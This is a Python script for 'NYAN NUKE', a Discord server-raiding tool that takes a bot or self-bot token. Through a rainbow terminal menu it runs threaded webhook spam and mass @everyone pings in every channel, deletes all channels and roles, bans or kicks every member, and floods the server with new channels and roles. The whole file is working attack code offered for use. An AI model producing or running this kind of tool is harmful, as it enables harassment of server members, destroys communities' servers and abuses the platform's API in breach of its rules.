#!/usr/bin/env python3
"""
NYAN NUKE — Discord Self-Bot Terminal Tool
Works on Linux, macOS, Windows, Termux
"""

import os
import sys
import time
import math
import getpass
import requests
import threading

try:
    import colorama
    colorama.init(autoreset=True)
except ImportError:
    pass

# ── ANSI helpers ──────────────────────────────────────────────────────────────

def rgb(r, g, b, text):
    return f"\033[38;2;{r};{g};{b}m{text}\033[0m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def rainbow_char(char, offset):
    """Return a character colored with a rainbow hue based on offset."""
    hue = (offset % 360) / 360.0
    # HSV to RGB (S=1, V=1)
    h = hue * 6
    i = int(h)
    f = h - i
    q = 1 - f
    p = 0
    t = f
    palette = [
        (1, t, p), (q, 1, p), (p, 1, t),
        (p, q, 1), (t, p, 1), (1, p, q),
    ]
    r_f, g_f, b_f = palette[i % 6]
    return rgb(int(r_f * 255), int(g_f * 255), int(b_f * 255), char)

def rainbow_text(text, offset=0):
    return "".join(rainbow_char(c, offset + i * 15) for i, c in enumerate(text))

# ── NYAN ASCII ────────────────────────────────────────────────────────────────

NYAN_ART = r"""
 ███╗   ██╗██╗   ██╗ █████╗ ███╗   ██╗
 ████╗  ██║╚██╗ ██╔╝██╔══██╗████╗  ██║
 ██╔██╗ ██║ ╚████╔╝ ███████║██╔██╗ ██║
 ██║╚██╗██║  ╚██╔╝  ██╔══██║██║╚██╗██║
 ██║ ╚████║   ██║   ██║  ██║██║ ╚████║
 ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
"""

NUKE_ART = r"""
 ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
 ████╗  ██║██║   ██║██║ ██╔╝██╔════╝
 ██╔██╗ ██║██║   ██║█████╔╝ █████╗  
 ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
 ██║ ╚████║╚██████╔╝██║  ██╗███████╗
 ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
"""

def print_banner(offset=0):
    for line in NYAN_ART.splitlines():
        print(rainbow_text(line, offset))
        offset += 20
    for line in NUKE_ART.splitlines():
        print(rainbow_text(line, offset))
        offset += 20
    print()

# ── Discord API ───────────────────────────────────────────────────────────────

BASE = "https://discord.com/api/v10"

def headers(token):
    # Bot tokens require "Bot " prefix; user tokens do not
    auth = f"Bot {token}" if not token.startswith("Bot ") else token
    return {
        "Authorization": auth,
        "Content-Type": "application/json",
        "User-Agent": "DiscordBot (https://github.com/crimsonpardon/NyanCat, 1.0)",
    }

def get_me(token):
    r = requests.get(f"{BASE}/users/@me", headers=headers(token))
    return r.json() if r.ok else None

def get_guilds(token):
    # /users/@me/guilds works for both bot and user tokens
    r = requests.get(f"{BASE}/users/@me/guilds?limit=200", headers=headers(token))
    return r.json() if r.ok else []

def get_guild(token, guild_id):
    r = requests.get(f"{BASE}/guilds/{guild_id}", headers=headers(token))
    return r.json() if r.ok else {}

def get_channels(token, guild_id):
    r = requests.get(f"{BASE}/guilds/{guild_id}/channels", headers=headers(token))
    return r.json() if r.ok else []

def get_roles(token, guild_id):
    r = requests.get(f"{BASE}/guilds/{guild_id}/roles", headers=headers(token))
    return r.json() if r.ok else []

def get_members(token, guild_id, limit=1000):
    r = requests.get(
        f"{BASE}/guilds/{guild_id}/members",
        headers=headers(token),
        params={"limit": limit},
    )
    return r.json() if r.ok else []

def get_bans(token, guild_id):
    r = requests.get(f"{BASE}/guilds/{guild_id}/bans", headers=headers(token))
    return r.json() if r.ok else []

def get_webhooks(token, channel_id):
    r = requests.get(f"{BASE}/channels/{channel_id}/webhooks", headers=headers(token))
    return r.json() if r.ok else []

def api_delete(token, path):
    return requests.delete(f"{BASE}{path}", headers=headers(token))

def api_post(token, path, data=None):
    return requests.post(f"{BASE}{path}", headers=headers(token), json=data or {})

def api_patch(token, path, data):
    return requests.patch(f"{BASE}{path}", headers=headers(token), json=data)

def rate_safe(fn, *args, retries=3):
    for _ in range(retries):
        r = fn(*args)
        if hasattr(r, "status_code") and r.status_code == 429:
            retry_after = r.json().get("retry_after", 1)
            time.sleep(float(retry_after) + 0.1)
        else:
            return r
    return r

# ── UI helpers ────────────────────────────────────────────────────────────────

def status(msg, ok=True):
    icon = rgb(80, 255, 80, "✔") if ok else rgb(255, 80, 80, "✘")
    print(f"  {icon}  {msg}")

def divider():
    print(rgb(80, 80, 120, "  " + "─" * 50))

def prompt(msg):
    return input(rainbow_text(f"  ❯ {msg}: "))

# ── Actions ───────────────────────────────────────────────────────────────────

def action_webhook_spam(token, guild_id, settings=None):
    """Create a webhook per text channel and spam it 99 times."""
    name    = settings.get("name", "NYAN") if settings else "NYAN"
    message = settings.get("message", "@everyone 💥") if settings else "@everyone 💥"
    count   = settings.get("count", 99) if settings else 99

    channels = [c for c in get_channels(token, guild_id) if c.get("type") == 0]
    if not channels:
        status("No text channels found.", ok=False)
        return

    def spam_channel(ch):
        whs = get_webhooks(token, ch["id"])
        if not whs:
            r = api_post(token, f"/channels/{ch['id']}/webhooks", {"name": name})
            if not r.ok:
                return
            wh = r.json()
        else:
            wh = whs[0]

        wh_url = f"https://discord.com/api/webhooks/{wh['id']}/{wh['token']}"
        for _ in range(count):
            requests.post(wh_url, json={"content": message, "username": name})
            time.sleep(0.05)
        status(f"Spammed #{ch['name']} ×{count}")

    threads = [threading.Thread(target=spam_channel, args=(ch,)) for ch in channels]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

def action_mass_ping(token, guild_id):
    """Ping @everyone 99 times across every text channel."""
    channels = [c for c in get_channels(token, guild_id) if c.get("type") == 0]
    if not channels:
        status("No text channels.", ok=False)
        return

    def ping_channel(ch):
        for i in range(99):
            rate_safe(
                api_post, token,
                f"/channels/{ch['id']}/messages",
                {"content": f"@everyone ping {i+1}/99 💥"},
            )
        status(f"Pinged #{ch['name']} 99×")

    threads = [threading.Thread(target=ping_channel, args=(ch,)) for ch in channels]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

def action_create_channels(token, guild_id):
    n = prompt("How many channels to create")
    name = prompt("Channel name base (e.g. nuked)")
    for i in range(int(n)):
        rate_safe(api_post, token, f"/guilds/{guild_id}/channels", {"name": f"{name}-{i+1}", "type": 0})
        status(f"Created #{name}-{i+1}")

def action_delete_channels(token, guild_id):
    channels = get_channels(token, guild_id)
    for ch in channels:
        rate_safe(api_delete, token, f"/channels/{ch['id']}")
        status(f"Deleted #{ch.get('name','?')}")

def action_create_roles(token, guild_id):
    n = prompt("How many roles to create")
    name = prompt("Role name base (e.g. nuked)")
    for i in range(int(n)):
        rate_safe(api_post, token, f"/guilds/{guild_id}/roles", {"name": f"{name}-{i+1}"})
        status(f"Created @{name}-{i+1}")

def action_delete_roles(token, guild_id):
    roles = get_roles(token, guild_id)
    for role in roles:
        if role.get("managed") or role.get("name") == "@everyone":
            continue
        rate_safe(api_delete, token, f"/guilds/{guild_id}/roles/{role['id']}")
        status(f"Deleted @{role['name']}")

def action_ban_all(token, guild_id):
    members = get_members(token, guild_id)
    me = get_me(token)
    me_id = me["id"] if me else None
    for m in members:
        uid = m["user"]["id"]
        if uid == me_id:
            continue
        rate_safe(api_put_ban, token, guild_id, uid)
        status(f"Banned {m['user'].get('username','?')}")

def api_put_ban(token, guild_id, user_id):
    return requests.put(
        f"{BASE}/guilds/{guild_id}/bans/{user_id}",
        headers=headers(token),
        json={"delete_message_days": 0},
    )

def action_kick_all(token, guild_id):
    members = get_members(token, guild_id)
    me = get_me(token)
    me_id = me["id"] if me else None
    for m in members:
        uid = m["user"]["id"]
        if uid == me_id:
            continue
        rate_safe(api_delete, token, f"/guilds/{guild_id}/members/{uid}")
        status(f"Kicked {m['user'].get('username','?')}")

def action_unban_all(token, guild_id):
    bans = get_bans(token, guild_id)
    for ban in bans:
        uid = ban["user"]["id"]
        rate_safe(api_delete, token, f"/guilds/{guild_id}/bans/{uid}")
        status(f"Unbanned {ban['user'].get('username','?')}")

def action_prune(token, guild_id):
    days = prompt("Prune members inactive for how many days (1-30)")
    r = api_post(token, f"/guilds/{guild_id}/prune", {"days": int(days), "compute_prune_count": True})
    if r.ok:
        status(f"Pruned {r.json().get('pruned','?')} members")
    else:
        status("Prune failed", ok=False)

def action_customize_webhook(token, guild_id):
    divider()
    print(rainbow_text("  Webhook Customization"))
    divider()
    name    = prompt("Webhook display name")
    message = prompt("Spam message (use @everyone for ping)")
    count   = int(prompt("How many times per channel (max 999)"))
    count   = min(count, 999)
    settings = {"name": name, "message": message, "count": count}
    action_webhook_spam(token, guild_id, settings)

def action_leave_server(token, guild_id):
    confirm = prompt("Type YES to confirm leaving the server")
    if confirm.strip().upper() == "YES":
        # Bots leave via DELETE /users/@me/guilds/{id}
        r = api_delete(token, f"/users/@me/guilds/{guild_id}")
        status("Left server." if r.ok else f"Failed ({r.status_code}).", ok=r.ok)

# ── Action menu ───────────────────────────────────────────────────────────────

ACTIONS = {
    "1": ("Webhook Spam (All Channels)",    action_webhook_spam),
    "2": ("Create Channels",                action_create_channels),
    "3": ("Delete Channels",                action_delete_channels),
    "4": ("Create Roles",                   action_create_roles),
    "5": ("Delete Roles",                   action_delete_roles),
    "6": ("Ban Members",                    action_ban_all),
    "7": ("Kick Members",                   action_kick_all),
    "8": ("Unban All Members",              action_unban_all),
    "9": ("Prune Inactive Members",         action_prune),
    "A": ("Customize Webhook Settings",     action_customize_webhook),
    "B": ("Leave Server",                   action_leave_server),
    "M": ("Mass Ping (99+ per channel)",    action_mass_ping),
}

def show_action_menu(guild_name):
    clear()
    print_banner(offset=int(time.time() * 50) % 360)
    divider()
    print(rainbow_text(f"  Server: {guild_name}"))
    divider()
    for key, (label, _) in ACTIONS.items():
        color = (100 + ord(key) * 7) % 255
        icon = rgb(color, 255 - color, 180, f"[{key}]")
        print(f"  {icon}  {label}")
    divider()
    print(rgb(150, 150, 150, "  [0]  ← Back to server list"))
    divider()

# ── Server list ───────────────────────────────────────────────────────────────

def show_server_list(token, guilds, me):
    clear()
    print_banner(offset=int(time.time() * 50) % 360)
    divider()
    uname = me.get("username", "?") + "#" + me.get("discriminator", "0")
    print(rainbow_text(f"  Logged in as: {uname}"))
    divider()
    for i, g in enumerate(guilds):
        idx = rgb(255, 200, 50, f"[{i+1}]")
        print(f"  {idx}  {g['name']}")
    divider()
    print(rgb(150, 150, 150, "  [r] Refresh   [t] Change Token   [q] Quit"))
    divider()

# ── Token flow ────────────────────────────────────────────────────────────────

def ask_token():
    clear()
    print_banner()
    divider()
    print(rainbow_text("  Enter Bot / Self-Bot Token"))
    divider()
    token = getpass.getpass(rainbow_text("  ❯ Paste token (hidden): "))
    return token.strip()

# ── Main loop ─────────────────────────────────────────────────────────────────

def main():
    token = ask_token()

    while True:
        me = get_me(token)
        if not me or "id" not in me:
            clear()
            print_banner()
            err = me.get("message", "Unknown error") if me else "No response"
            status(f"Token rejected — {err}", ok=False)
            status("Make sure you copied the full bot token from Discord Developer Portal.", ok=False)
            time.sleep(2)
            token = ask_token()
            continue

        guilds = get_guilds(token)

        # Server selection loop
        while True:
            show_server_list(token, guilds, me)
            choice = input(rainbow_text("  ❯ Select server or option: ")).strip().lower()

            if choice == "q":
                clear()
                print(rainbow_text("  Goodbye 👋"))
                sys.exit(0)

            elif choice == "t":
                token = ask_token()
                break  # restart outer loop to re-validate

            elif choice == "r":
                guilds = get_guilds(token)
                continue

            elif choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(guilds):
                    guild_id = guilds[idx]["id"]
                    guild_name = guilds[idx]["name"]

                    # Action selection loop
                    while True:
                        show_action_menu(guild_name)
                        action = input(rainbow_text("  ❯ Choose action: ")).strip().upper()

                        if action == "0":
                            break

                        if action in ACTIONS:
                            label, fn = ACTIONS[action]
                            divider()
                            print(rainbow_text(f"  Running: {label}"))
                            divider()
                            try:
                                fn(token, guild_id)
                            except Exception as e:
                                status(f"Error: {e}", ok=False)
                            input(rgb(150, 150, 150, "\n  Press Enter to continue..."))
                        else:
                            status("Unknown option.", ok=False)
                            time.sleep(0.8)
                else:
                    status("Invalid selection.", ok=False)
                    time.sleep(0.8)
            else:
                status("Unknown input.", ok=False)
                time.sleep(0.8)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print(rainbow_text("\n  Interrupted. Bye 👋\n"))
        sys.exit(0)
